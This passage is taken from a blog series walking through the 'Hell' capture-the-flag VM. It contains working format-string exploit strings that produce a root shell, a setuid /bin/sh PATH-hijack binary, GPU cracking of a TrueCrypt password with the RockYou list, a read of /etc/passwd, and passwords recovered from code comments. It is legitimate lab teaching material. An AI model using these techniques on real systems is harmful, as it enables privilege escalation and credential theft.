<p>Apparently, though, you can overwrite entries in the .dtor part of the binary - don&rsquo;t ask me what .dtor is, but I had great fun gradually overwriting random memory locations and crashing the application over and over and over again&hellip;</p>

<p>Here are some of the format strings I fabricated while on my journey - you can get an idea of my thought pattern and the things I tested.  It&rsquo;s also pretty obvious when I went back to basics about 7 attempts in.</p>

<p>[plain]
$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo;&rsquo;)-%64362u-%116\$n
$(python -c &lsquo;print &ldquo;AAAA&rdquo;&rsquo;)-%64362u-%117\$n.
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo;&rsquo;)%64362u-%119\$n.
$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo; + &ldquo;\x5e\xf8\xff\xbf&rdquo;&rsquo;)-%64362u-%4\$n-%5\$n
$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo;&rsquo;)-%116\$n.
$(python -c &lsquo;print &ldquo;AAAA&rdquo;&rsquo;)%117\$x
%64364u$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo;&rsquo;)%119\$n.
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAABBBB%49136u%120\$hn%15217u%119\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABB-%00001c%116\$.x%00001c%114\$.x
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABBBB%49134u%113\$hn%15217c%112\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABBBB%49134u%118\$hn%15217u%117\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAABBBB%49136u%120\$hn%15217c%119\$hn
[/plain]</p>

<p>I spent a lot of time staring at segfault after segfault until I stumbled upon this random combination of characters (I really really want to explain how I worked it out, but I&rsquo;m not 100% sure myself. I guess that&rsquo;s a follow up post sometime. Also, it is possible this wont work for you).</p>

<p>[plain]
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn[/plain]</p>

<p>Which when executed like this</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ /home/oj/echo $(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn[/plain]</p>

<p>dropped me to a shell.</p>

<p>[plain gutter=&ldquo;false&rdquo;]</p>

<h1>id</h1>

<p>uid=0(root) gid=1005(oj) groups=0(root),1005(oj)</p>

<h1>whoami</h1>

<p>root</p>

<h1>cat /root/flag.txt</h1>

<p>Congratulations of beating Hell.</p>

<p>I hope you enjoyed it and there weren&rsquo;t to many trolls in here for you.</p>

<p>Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242</p>

<p>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de</p>

<h1>[/plain]</h1>

<p><img src="http://30.media.tumblr.com/tumblr_lk4maa7rMH1qfgrblo1_500.gif" alt="" /></p>

<p>Like a baws.  Now I&rsquo;m going to exorcise the VM and purge every last shred of it from my SSD.  BEGONE FOUL DEMON !</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hell Walkthrough - Part 4]]></title>
    <link href="http://recrudesce.github.io/blog/2014/07/20/hell-walkthrough-part-4/"/>
    <updated>2014-07-20T19:46:02+01:00</updated>
    <id>http://recrudesce.github.io/blog/2014/07/20/hell-walkthrough-part-4</id>
    <content type="html"><![CDATA[<p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | Part 4 | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>

<p>Yup, we&rsquo;re still going.  Told you it&rsquo;d be a long journey didn&rsquo;t I ?</p>

<h2>Tales from the Crypt, But First I&rsquo;ll Rock You</h2>

<p>George has one file in his home folder - a Truecrypt container.  I guess no one has told George that TrueCrypt isn&rsquo;t recommended any more - he should be using something else.  <em>shakes fist at the NSA</em></p>

<!-- more -->


<p>Mounting the TrueCrypt container requires us to know the container password, which we currently don&rsquo;t have.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
george@hell:~$ truecrypt &ndash;mount container.tc
Enter mount directory [default]:
Enter password for /home/george/container.tc:
Enter keyfile [none]:
Protect hidden volume (if any)? (y=Yes/n=No) [No]:
No password or keyfile specified.[/plain]</p>

<p>Looking around a bit more, it looks like George has also signed up for RockYou</p>

<p>[plain gutter=&ldquo;false&rdquo;]
From: <a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#58;&#97;&#100;&#109;&#x69;&#x6e;&#x40;&#x72;&#x6f;&#99;&#107;&#x79;&#x6f;&#117;&#46;&#x63;&#x6f;&#109;">&#97;&#100;&#x6d;&#x69;&#110;&#x40;&#114;&#111;&#99;&#107;&#121;&#111;&#117;&#46;&#99;&#111;&#109;</a>
To: <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#58;&#115;&#x75;&#x70;&#101;&#114;&#95;&#97;&#100;&#x6d;&#x69;&#110;&#x40;&#104;&#101;&#x6c;&#x6c;&#46;&#x63;&#x6f;&#109;">&#x73;&#x75;&#x70;&#x65;&#114;&#x5f;&#97;&#x64;&#109;&#105;&#x6e;&#64;&#104;&#101;&#108;&#108;&#x2e;&#99;&#x6f;&#109;</a>
Subject: Account Activation
Date: 13th November 2009</p>

<p>Thanks for signing up for your account. I hope you enjoy our services. [/plain]</p>

<p><em>ka-ching</em> George&rsquo;s password will be on the leaked RockYou wordlist.  oclHashCat can help us out here, thanks to the ability to use GPU&rsquo;s.  Yes, I&rsquo;m using a Windows PC for this, sue me.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
G:\Downloads\oclHashcat-1.21>oclHashcat64.exe -m 6211 -a 0 &ldquo;g:\downloads\container.tc&rdquo; g:\Downloads\dictionaries\catted\rockyou.txt</p>

<p>g:\downloads\container.tc:letsyouupdateyourfunnotesandmore</p>

<p>Session.Name&hellip;: oclHashcat
Status&hellip;&hellip;&hellip;: Cracked
Input.Mode&hellip;..: File (g:\Downloads\dictionaries\catted\rockyou.txt)
Hash.Target&hellip;.: File (g:\downloads\container.tc)
Hash.Type&hellip;&hellip;: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
Time.Started&hellip;: Sat Jul 12 23:06:15 2014 (17 secs)
Speed.GPU.#1&hellip;:    29889 H/s
Recovered&hellip;&hellip;: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress&hellip;&hellip;.: 496641/14343296 (3.46%)
Skipped&hellip;&hellip;..: 0/496641 (0.00%)
Rejected&hellip;&hellip;.: 1/496641 (0.00%)
HWMon.GPU.#1&hellip;: 97% Util, 56c Temp, 32% Fan</p>

<p>Started: Sat Jul 12 23:06:15 2014
Stopped: Sat Jul 12 23:06:37 2014[/plain]</p>

<p>That didn&rsquo;t take too long now did it ?  But we have the TrueCrypt container password, which makes mounting it a tiny bit easier now.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
george@hell:~$ truecrypt &ndash;mount container.tc
Enter mount directory [default]: ./tc
Enter password for /home/george/container.tc: letsyouupdateyourfunnotesandmore
Enter keyfile [none]:
Protect hidden volume (if any)? (y=Yes/n=No) [No]:</p>

<p>george@hell:~$ cd tc
george@hell:~/tc$ ls -l
total 2
-rwx&mdash;&mdash; 1 george george 1679 Jul  5 20:01 id_rsa
george@hell:~/tc$ [/plain]</p>

<p>Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
george@hell:~/tc$ ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#98;&#x61;&#x7a;&#122;&#97;&#64;&#x31;&#x32;&#x37;&#46;&#x30;&#46;&#48;&#46;&#x31;">&#98;&#97;&#122;&#122;&#97;&#x40;&#49;&#x32;&#x37;&#x2e;&#48;&#46;&#x30;&#46;&#49;</a> -i ./id_rsa
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul 13 21:18:28 2014 from 192.168.0.102
$ whoami
bazza[/plain]</p>

<p>Oh&hellip; I was expecting a bit more of a fight, but I guess Bazza trusts George, even though he uses defunct software that allows privilege escalation (look it up).  Fool.</p>

<h2>Bazza&rsquo;s Blockade</h2>

<p>Once again we&rsquo;re presented with 2 binaries, with SUID attributes set.  This time, however, we can read the files, which means we can decompile them.  Time to take a look</p>

<p>[c]int <em>_cdecl main()
{
  int result; // eax@6
  </em>BYTE v1[3]; // [sp+19h] [bp-417h]@3
  FILE <em>v2; // [sp+424h] [bp-Ch]@1
  const char </em>v3; // [sp+428h] [bp-8h]@1
  const char *v4; // [sp+42Ch] [bp-4h]@1</p>

<p>  v4 = &ldquo;900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2\n&rdquo;;
  v3 = &ldquo;1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id\n&rdquo;;
  printf(&ldquo;Checking integrity of part2&hellip;&rdquo;);
  v2 = popen(&ldquo;sha256sum /home/bazza/part2&rdquo;, &ldquo;r&rdquo;);
  if ( !v2 )
    puts(&ldquo;Failed to run command&rdquo;);
  fgets(v1, 1034, v2);
  if ( strcmp(v1, v4) )
  {
    puts(&ldquo;Uh oh&hellip;. Corrupted or in wrong directory (/home/bazza/)\n&rdquo;);
    result = 0;
  }
  else
  {
    puts(&ldquo; Done!!\n&rdquo;);
    printf(&ldquo;Checking integrity of calling target&hellip;&rdquo;);
    v2 = popen(&ldquo;sha256sum /usr/bin/id&rdquo;, &ldquo;r&rdquo;);
    if ( !v2 )
      puts(&ldquo;Failed to run command&rdquo;);
    fgets(v1, 1034, v2);
    if ( strcmp(v1, v3) )
    {
      puts(&ldquo;Target corrupt\n&rdquo;);
      result = 0;
    }
    else
    {
      puts(&ldquo; Done!!\n\nBinary and target confirmed.&rdquo;);
      system(&ldquo;/home/bazza/part2&rdquo;);
      pclose(v2);
      result = 0;
    }
  }
  return result;
}[/c]</p>

<p>OK, so part1 runs part2 (this time with an absolute path), so time for a quick peek into part2</p>

<p>[c]int <strong>cdecl main()
{
  </strong>gid_t v0; // eax@2
  int result; // eax@2</p>

<p>  if ( getegid() == 1003 )
  {
    puts(&ldquo;\nCan&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>&rdquo;);
    system(&ldquo;id&rdquo;);
    result = 0;
  }
  else
  {
    v0 = getegid();
    printf(&ldquo;\n\nError! %d ID detected &hellip; you&rsquo;re not allowed to run this, please use part 1!\n&rdquo;, v0);
    result = 0;
  }
  return result;
}[/c]</p>

<p>So, part2 will run only if the effective group identifier is 1003.  part1 has a SUID attribute set as group developers, which means you have to run part1 before part2.  If you run part2 first, this happens</p>

<p>[plain gutter=&ldquo;false&rdquo;]
Error! 1004 ID detected &hellip; you&rsquo;re not allowed to run this, please use part 1![/plain]</p>

<p>Running part1 changes our effective group identifier, and part2 changes our effective user identifier, but doesn&rsquo;t seem to drop us to a shell as that user (oj)</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ./part1
Checking integrity of part2&hellip; Done!!</p>

<p>Checking integrity of calling target&hellip; Done!!</p>

<p>Binary and target confirmed.</p>

<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
$ whoami
bazza[/plain]</p>

<p>A further look into the source code for part2 shows that it is not using an absolute path for the system(&ldquo;id&rdquo;) function, therefore we can trick this application into running a bogus id binary in the same way we did with the bogus chmod binary.  The source code is pretty much the same, apart from the fact I&rsquo;m using uid 1005 rather than 1000.</p>

<p>[c]#include &lt;stdio.h></p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main()
{
 setuid( 1005 );
 system(&ldquo;/usr/bin/id&rdquo;);
 system( &ldquo;/bin/sh -i&rdquo; );
}[/c]</p>

<p>This is compiled, placed in /tmp and made executable.  The path environment variable is modified as per last time and we&rsquo;re good to go.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ./part1
Checking integrity of part2&hellip; Done!!</p>

<p>Checking integrity of calling target&hellip; Done!!</p>

<p>Binary and target confirmed.</p>

<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
$ whoami
oj
[/plain]</p>

<p>Success !</p>

<p>Nearly there, only this hoop to jump through and we&rsquo;re done.  I figured this&rsquo;d be a 5 parter, now I know it is going to be.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hell Walkthrough - Part 3]]></title>
    <link href="http://recrudesce.github.io/blog/2014/07/19/hell-walkthrough-part-3/"/>
    <updated>2014-07-19T20:05:34+01:00</updated>
    <id>http://recrudesce.github.io/blog/2014/07/19/hell-walkthrough-part-3</id>
    <content type="html"><![CDATA[<p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | Part 3 | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>

<h2>I Want to Play a Game, But No Jigsaws, OK ?!</h2>

<p>The home folder for milk_4_life is pretty sparse, just a binary called &ldquo;game&rdquo;. However, it&rsquo;s owned by the george user, and has the suid attribute set.</p>

<p>[plain gutter=&ldquo;false&rdquo;]$ ls -l
total 20
&mdash;s&ndash;x&ndash;x 1 george      george      5743 Jun 19 18:24 game[/plain]</p>

<p>Running the binary produces the following output, which doesn&rsquo;t tell us much other than it&rsquo;s &ldquo;listening&rdquo;. Like a overly intrusive neighbour.</p>

<!-- more -->


<p>[plain gutter=&ldquo;false&rdquo;]
$ ./game
I&rsquo;m listening[/plain]</p>

<p>Netstat isn&rsquo;t available on this VM, so we have to find another way to obtain listening port information. Thankfully ss saves the day and shows the game binary IS actually listening, on port 1337 - h4x !</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ss -lp
State       Recv-Q Send-Q    Local Address:Port    Peer Address:Port
LISTEN      0      50        127.0.0.1:mysql       <em>:</em>
LISTEN      0      128       :::sunrpc             :::<em>
LISTEN      0      128       </em>:sunrpc              <em>:</em>
LISTEN      0      128       :::http               :::<em>
LISTEN      0      128       :::38035              :::</em>
LISTEN      0      128       <em>:35380               </em>:<em>
LISTEN      0      128       :::ssh                :::</em>
LISTEN      0      128       <em>:ssh                 </em>:<em>
LISTEN      0      10        </em>:1337                <em>:</em>
LISTEN      0      20        ::1:smtp              :::<em>
LISTEN      0      20        127.0.0.1:smtp        </em>:<em>
LISTEN      0      10        </em>:666                 <em>:</em>[/plain]</p>

<p>Connecting to the port from another session asks us to type &ldquo;START&rdquo; to begin. It&rsquo;s more fun to troll the code, though, by typing something completely different. Did you expect anything less of me ?</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ telnet 127.0.0.1 1337
Trying 127.0.0.1&hellip;
Connected to 127.0.0.1.
Escape character is &lsquo;^]&rsquo;.
Type &lsquo;START&rsquo; to begin</p>

<p>banana
No&hellip; START. S-T-A-R-T</p>

<p>Connection closed by foreign host.[/plain]</p>

<p>OK, enough messing around, let&rsquo;s see what this game does. Typing START presents us with a high score, and then math questions that only your high school math teacher would ask you infront of the rest of the class. Needless to say I&rsquo;m not answering any of these correctly !</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ telnet 127.0.0.1 1337
Trying 127.0.0.1&hellip;
Connected to 127.0.0.1.
Escape character is &lsquo;^]&rsquo;.
Type &lsquo;START&rsquo; to begin</p>

<p>START
Starting&hellip;</p>

<p>You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)</p>

<p>Quick what&rsquo;s&hellip; 924 x 541? Umm
Quick what&rsquo;s&hellip; 982 x 21? No idea
Quick what&rsquo;s&hellip; 194 x 542? Really ?
Quick what&rsquo;s&hellip; 679 x 733? WHY WOULD I NEED TO KNOW THIS !?
Quick what&rsquo;s&hellip; 960 x 248? I give up.
Quick what&rsquo;s&hellip; 718 x 646? THANKS OBAMA !
Quick what&rsquo;s&hellip; 162 x 784? ^C
Connection closed by foreign host[/plain]</p>

<p>Being the competitive person I am, I figured it would be fun to try and beat the score. More than 133723 points in 30 seconds means I have to answer 4457 correct answers a second. I can type quickly, but not that quickly. This requires some scripting - Python to the rescue ! This script connects to the game, reads the question, splits it based on &ldquo; x &rdquo; to get both numbers, performs the multiplication and sends the answer back. Granted I had some help on with this code - thanks c0ne !</p>

<p>[python]</p>

<h1>!/usr/bin/python</h1>

<p>import socket
import re</p>

<p>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((&lsquo;127.0.0.1&rsquo;,1337)) # hardcoded IP address
s.recv(1024)
s.send(&lsquo;START\n&rsquo;) # login procedure
s.recv(110)
while True:
    d = s.recv(200)
    l = re.findall(r&#8221;Quick what&rsquo;s&hellip; (.*?)\?&ldquo;, d)
    if not l:
        print d
        break
    (a,b) = l[0].split(&lsquo; x &rsquo;)
    mul = int(a) * int(b)
    print str(mul)
    s.send(str(mul)+&lsquo;\n&rsquo;)</p>

<p>print s.recv(1024)
s.close()[/python]</p>

<p>Running it produces a sense of authority over our robot overlords - I&rsquo;m gaming the game.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ python gamey3.py
125451
150858
498300
493353
60564
<strong><strong> SNIP </strong></strong>
174386
841312
53636
Final Score: 412619</p>

<p>!<em>!</em>!<em>!</em>! Congratulations, new high score (412619) !<em>!</em>!<em>!</em>!</p>

<p>I hear the faint sound of chmodding&hellip;&hellip;.[/plain]</p>

<p><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/high_score_320x320.png" alt="high_score_320x320" /></p>

<p>It seems that the binary performs an action when the highscore is beaten. I&rsquo;m not sure what it chmods, but I wonder if we can play this game at it&rsquo;s own game and make it run a bogus binary. There&rsquo;s a distinct possibility the code is relying on the PATH environment variable and just calling system(&ldquo;chmod file&rdquo;) rather than using an absolute path.</p>

<p>So, a bogus chmod binary is created using the following source, compiled, placed in /tmp on the VM and made executable (do I need to show you how to do this ? No ? Good. Saves me the typing.)</p>

<p>[c]#include &lt;stdio.h></p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main()
{
 setuid( 1000 );
 system(&ldquo;id&rdquo;);
 system( &ldquo;/bin/sh -i&rdquo; );
}[/c]</p>

<p>The path environment variable is modified to make /tmp the first location checked</p>

<p>[plain gutter=&ldquo;false&rdquo;]$ PATH=/tmp:$PATH
$ export | grep PATH
export PATH=&lsquo;/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&rsquo;
[/plain]</p>

<p>So, hopefully, if all goes to plan, when we beat the score it should run our fake chmod binary and drop us to a shell. How about we give it a go ? The game is started, and the Python script is run to beat the score (I&rsquo;m not going to show you again, just scroll up if you want to see what it looks like).</p>

<p>The score is beaten and we are indeed dropped to a new shell as the george user.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ./game
I&rsquo;m listening
uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
$
[/plain]</p>

<p><img src="http://31.media.tumblr.com/tumblr_lwipupOVfN1qh59n0o1_500.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hell Walkthrough – Part 2]]></title>
    <link href="http://recrudesce.github.io/blog/2014/07/18/hell-walkthrough-part-2/"/>
    <updated>2014-07-18T21:27:04+01:00</updated>
    <id>http://recrudesce.github.io/blog/2014/07/18/hell-walkthrough-part-2</id>
    <content type="html"><![CDATA[<p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | Part 2 | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>

<p>So, yesterday we got a shell on Hell as www-data. Today we&rsquo;ll escalate through some of the users on our quest to root.  If you&rsquo;ve not read <a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a>, I suggest you do so now.  I&rsquo;ll wait.  Go on, don&rsquo;t be shy, I&rsquo;ll still be here when you get back.</p>

<p>Done ?  Great - let us continue.</p>

<!-- more -->


<p>Catting /etc/passwd gives us a list of users that are potentially useful</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
george:x:1000:1000:george,,,:/home/george:/bin/bash
jack:x:1001:1001::/home/jack:/bin/sh
milk_4_life:x:1002:1002::/home/milk_4_life:/bin/sh
developers:x:1003:1003::/home/developers:/bin/sh
bazza:x:1004:1004::/home/bazza:/bin/sh
oj:x:1005:1005::/home/oj:/bin/sh
[/plain]</p>

<hr />

<h2>Imagine Jack and Jill, But With Half the Cast Replaced with a Cardboard Cutout of g0tmi1k</h2>

<p>Escalating from the www-data user to the jack user is pretty inconsequential. People who write web sites, especially disturbing ones such as this, will usually not bother to create separate accounts for things such as database logins.</p>

<p>A quick grep on the files in /super_secret_login_path_muhahaha/ for the word &ldquo;password&rdquo; results in the following</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ grep password /var/www/super_secret_login_path_muhahaha/<em>
index.php:<INPUT name="password" id="password" type="password" value=""/>
login.php:  $password = mysql_escape_string($_POST[&ldquo;password&rdquo;]);
login.php:  // mysql_connect(&ldquo;127.0.0.1&rdquo;, &ldquo;Jack&rdquo;, &ldquo;zgcR6mU6pX&rdquo;) or die (&ldquo;Server Error&rdquo;); I&rsquo;ll change this back once development is done. Got sick of typing my password.
login.php:  $sql = &ldquo;SELECT COUNT(</em>) FROM users WHERE username=&lsquo;$username&rsquo; and password=&lsquo;$password&rsquo;&rdquo;;
personal.php:<INPUT name="password" id="password" type="password" value=""/>
[/plain]</p>

<p>Oooh, what do I spy with my little eye ? Could that be Jack&rsquo;s password commented out in login.php ? Let us try this password&hellip;</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ su jack
Password: zgcR6mU6pX</p>

<p>$ whoami
jack
$[/plain]</p>

<p>Well, that was easy. But then the 2nd hurdle usually is - you kinda get cocky after clearing the first one, that the second one is jumped based on pure thrill. Now we get to trip over on every hurdle between us and the finish line. Get the first aid kit ready, we&rsquo;re going to need it.</p>

<hr />

<h2>Got Milk ? Want Any ?</h2>

<p>Poking around Jack&rsquo;s home folder is like walking into a public toilet while bursting for a wee - you don&rsquo;t really want to touch anything, but have to else you&rsquo;re going to have problems.</p>

<p>The first thing that draws my eye is the g0tmi1k_pics folder. It&rsquo;s somewhere you know you don&rsquo;t want to go, but seems to have this strange come-hither vibe about it. It&rsquo;s like a car crash&hellip; gruesome but you can&rsquo;t help but look. So I did. Now I wish I didn&rsquo;t. Exhibit A, and B, and C.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/1.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/1.jpg" alt="1" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/2.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/2.jpg" alt="2" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/3.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/3.jpg" alt="3" /></a></p>

<p>Yeah&hellip;
Jack, you&rsquo;re a strange one, I&rsquo;ll give you that. Hang on, I think I can hear the men in white coats knocking. Yup, they&rsquo;re asking for you - shall I tell them you&rsquo;re &ldquo;out&rdquo; ?</p>

<p>So, while Jack might reuse passwords, he&rsquo;s sensible enough to use PGP when sending emails. /var/mail/jack/received contains an email, which is encrypted.</p>

<p>[plain]
&mdash;&ndash;BEGIN PGP MESSAGE&mdash;&ndash;
Version: BCPG C# v1.6.1.0</p>

<p>hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
=svWU
&mdash;&ndash;END PGP MESSAGE&mdash;&ndash;[/plain]</p>

<p>As suspected, Jack uses PGP on the local host, therefore his PGP keys are stored in /home/jack/.pgp, complete with a note giving us a password hint.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ls -l .pgp
ls -l .pgp
total 12
-rwx&mdash;&mdash; 1 jack jack   39 Jun 18 12:35 note
-rwx&mdash;&mdash; 1 jack jack 1802 Jun 18 12:20 pgp.priv
-rwx&mdash;&mdash; 1 jack jack  890 Jun 18 12:24 pgp.pub
$ cat .pgp/note
The usual password as with everything.
$
[/plain]</p>

<p>We can assume the password is either <strong>g0tmi1k69</strong> or <strong>zgcR6mU6pX</strong>. GPG is installed, so the next logical step is to try and decrypt the email using either of these two passwords and Jack&rsquo;s PGP private key.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ gpg &ndash;import .pgp/pgp.priv
gpg: key 3F18AB0A: secret key imported
gpg: /home/jack/.gnupg/trustdb.gpg: trustdb created
gpg: key 3F18AB0A: public key &ldquo;<a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x6a;&#97;&#x63;&#107;&#x40;&#x63;&#x6f;&#119;&#108;&#111;&#118;&#101;&#114;&#x73;&#x2e;&#x63;&#111;&#109;">&#x6a;&#97;&#99;&#x6b;&#64;&#x63;&#x6f;&#119;&#108;&#x6f;&#x76;&#x65;&#x72;&#x73;&#46;&#99;&#x6f;&#x6d;</a>&rdquo; imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
$ gpg -o email.txt /var/mail/jack/received/message.eml</p>

<p>You need a passphrase to unlock the secret key for
user: &ldquo;<a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#x6a;&#97;&#x63;&#107;&#64;&#99;&#111;&#119;&#108;&#x6f;&#118;&#x65;&#114;&#x73;&#46;&#99;&#111;&#x6d;">&#x6a;&#x61;&#x63;&#x6b;&#x40;&#x63;&#x6f;&#119;&#x6c;&#x6f;&#x76;&#x65;&#x72;&#x73;&#x2e;&#x63;&#x6f;&#x6d;</a>&rdquo;</p>

<p>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18</p>

<p>Enter passphrase: g0tmi1k69
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
      &ldquo;<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x6a;&#x61;&#x63;&#x6b;&#64;&#99;&#111;&#x77;&#108;&#x6f;&#118;&#x65;&#x72;&#115;&#46;&#99;&#111;&#x6d;">&#106;&#x61;&#x63;&#x6b;&#64;&#99;&#111;&#119;&#108;&#x6f;&#118;&#x65;&#114;&#x73;&#46;&#x63;&#111;&#109;</a>&rdquo;
gpg: WARNING: message was not integrity protected
$ cat email.txt
